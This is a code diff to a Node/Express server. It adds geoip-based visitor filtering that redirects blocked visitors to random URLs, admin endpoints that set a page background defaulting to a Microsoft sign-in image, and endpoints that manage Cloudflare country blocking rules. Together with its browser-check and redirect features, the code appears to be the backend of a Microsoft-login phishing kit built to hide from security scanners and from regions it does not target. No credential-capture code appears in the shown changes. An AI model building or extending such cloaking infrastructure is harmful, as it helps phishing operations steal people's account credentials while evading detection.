@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
+const geoip = require('geoip-lite');
 
 // Load environment variables from .env file
 if (fs.existsSync('.env')) {
@@ -114,12 +115,22 @@ function geoBlockMiddleware(req, res, next) {
         return next();
     }
 
-    // Get country from Cloudflare header (CF-IPCountry)
-    const country = req.get('CF-IPCountry');
+    // Get country code - try Cloudflare header first, then geoip-lite
+    let country = req.get('CF-IPCountry');
+    let detectionMethod = 'cloudflare';
 
     if (!country || country === 'XX') {
-        // Unknown country - allow by default
-        return next();
+        // Fallback to geoip-lite for local IP geolocation
+        const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
+        const geo = geoip.lookup(clientIp);
+        
+        if (geo && geo.country) {
+            country = geo.country;
+            detectionMethod = 'geoip-lite';
+        } else {
+            // Unknown country - allow by default
+            return next();
+        }
     }
 
     let shouldBlock = false;
@@ -139,7 +150,7 @@ function geoBlockMiddleware(req, res, next) {
             Math.floor(Math.random() * geoBlockConfig.randomRedirects.length)
         ];
         
-        console.log(`🚫 Geo-blocked ${country} visitor, redirecting to ${randomUrl}`);
+        console.log(`🚫 Geo-blocked ${country} visitor (detected via ${detectionMethod}), redirecting to ${randomUrl}`);
         return res.redirect(randomUrl);
     }
 
@@ -2194,6 +2205,81 @@ app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
     }
 });
 
+// Admin endpoint to get background configuration
+app.get('/api/admin/background-url', requireAdminAuth, (req, res) => {
+    try {
+        const backgroundConfigPath = path.join(__dirname, 'background-config.json');
+        let backgroundUrl = 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg';
+
+        if (fs.existsSync(backgroundConfigPath)) {
+            const backgroundConfig = JSON.parse(fs.readFileSync(backgroundConfigPath, 'utf8'));
+            if (backgroundConfig.backgroundUrl) {
+                backgroundUrl = backgroundConfig.backgroundUrl;
+            }
+        }
+
+        res.json({
+            success: true,
+            backgroundUrl: backgroundUrl
+        });
+    } catch (error) {
+        console.error('Error getting background URL:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get background URL',
+            details: error.message
+        });
+    }
+});
+
+// Admin endpoint to update background URL
+app.post('/api/admin/background-url', requireAdminAuth, (req, res) => {
+    try {
+        const { backgroundUrl } = req.body;
+
+        if (!backgroundUrl) {
+            return res.status(400).json({
+                success: false,
+                error: 'backgroundUrl is required'
+            });
+        }
+
+        // Validate URL
+        try {
+            new URL(backgroundUrl);
+        } catch (urlError) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid URL format'
+            });
+        }
+
+        // Update background-config.json
+        const backgroundConfigPath = path.join(__dirname, 'background-config.json');
+        const backgroundConfig = {
+            backgroundUrl: backgroundUrl,
+            lastUpdated: new Date().toISOString()
+        };
+
+        fs.writeFileSync(backgroundConfigPath, JSON.stringify(backgroundConfig, null, 2));
+        console.log(`🎨 Background URL updated to: ${backgroundUrl}`);
+
+        res.json({
+            success: true,
+            backgroundUrl: backgroundUrl,
+            message: 'Background URL updated successfully'
+        });
+
+    } catch (error) {
+        console.error('Error updating background URL:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to update background URL',
+            details: error.message
+        });
+    }
+});
+
 // Admin analytics endpoint
 app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
     try {
@@ -2580,6 +2666,146 @@ app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, re
     }
 });
 
+// Cloudflare country rules endpoints
+app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
+    try {
+        if (!cloudflareConfig.configured) {
+            return res.json({
+                success: true,
+                rules: [],
+                configured: false,
+                message: 'Cloudflare not configured - no country rules available'
+            });
+        }
+
+        // Get firewall rules from Cloudflare
+        const rulesResult = await callCloudflareAPI('/firewall/rules');
+        
+        // Filter for country-based rules
+        const countryRules = rulesResult.result.filter(rule => 
+            rule.filter && rule.filter.expression && rule.filter.expression.includes('ip.geoip.country')
+        );
+
+        res.json({
+            success: true,
+            rules: countryRules,
+            configured: true
+        });
+
+    } catch (error) {
+        console.error('Error fetching country rules:', error.message);
+        res.json({
+            success: false,
+            rules: [],
+            configured: cloudflareConfig.configured,
+            error: 'Failed to fetch country rules',
+            message: error.message
+        });
+    }
+});
+
+app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
+    try {
+        const { countries, action, description } = req.body;
+
+        if (!countries || !Array.isArray(countries) || countries.length === 0) {
+            return res.status(400).json({
+                success: false,
+                error: 'Countries array is required'
+            });
+        }
+
+        if (!action || !['block', 'challenge', 'allow'].includes(action)) {
+            return res.status(400).json({
+                success: false,
+                error: 'Valid action required (block, challenge, or allow)'
+            });
+        }
+
+        // Create Cloudflare firewall rule expression
+        const countryList = countries.map(c => `"${c}"`).join(' ');
+        const expression = `(ip.geoip.country in {${countryList}})`;
+
+        // Create filter first
+        const filterResult = await callCloudflareAPI('/filters', 'POST', [{
+            expression: expression,
+            description: description || `Country rule for ${countries.join(', ')}`
+        }]);
+
+        if (!filterResult.result || filterResult.result.length === 0) {
+            throw new Error('Failed to create filter');
+        }
+
+        const filterId = filterResult.result[0].id;
+
+        // Create firewall rule using the filter
+        const ruleResult = await callCloudflareAPI('/firewall/rules', 'POST', [{
+            filter: { id: filterId },
+            action: action,
+            description: description || `Country rule for ${countries.join(', ')}`
+        }]);
+
+        console.log(`🌍 Created Cloudflare country rule: ${action} for ${countries.join(', ')}`);
+
+        res.json({
+            success: true,
+            rule: ruleResult.result[0],
+            message: `Country rule created successfully`
+        });
+
+    } catch (error) {
+        console.error('Error creating country rule:', error.message);
+        res.json({
+            success: false,
+            error: 'Failed to create country rule',
+            message: error.message
+        });
+    }
+});
+
+app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, async (req, res) => {
+    try {
+        const { ruleId } = req.params;
+
+        if (!ruleId) {
+            return res.status(400).json({
+                success: false,
+                error: 'Rule ID is required'
+            });
+        }
+
+        // Get the rule to find its filter ID
+        const ruleResult = await callCloudflareAPI(`/firewall/rules/${ruleId}`);
+        const filterId = ruleResult.result.filter?.id;
+
+        // Delete the firewall rule
+        await callCloudflareAPI(`/firewall/rules/${ruleId}`, 'DELETE');
+
+        // Delete the associated filter if it exists
+        if (filterId) {
+            try {
+                await callCloudflareAPI(`/filters/${filterId}`, 'DELETE');
+            } catch (filterError) {
+                console.warn('Failed to delete filter:', filterError.message);
+            }
+        }
+
+        console.log(`🗑️ Deleted Cloudflare country rule: ${ruleId}`);
+
+        res.json({
+            success: true,
+            message: 'Country rule deleted successfully'
+        });
+
+    } catch (error) {
+        console.error('Error deleting country rule:', error.message);
+        res.json({
+            success: false,
+            error: 'Failed to delete country rule',
+            message: error.message
+        });
+    }
+});
 
 
 // Start server
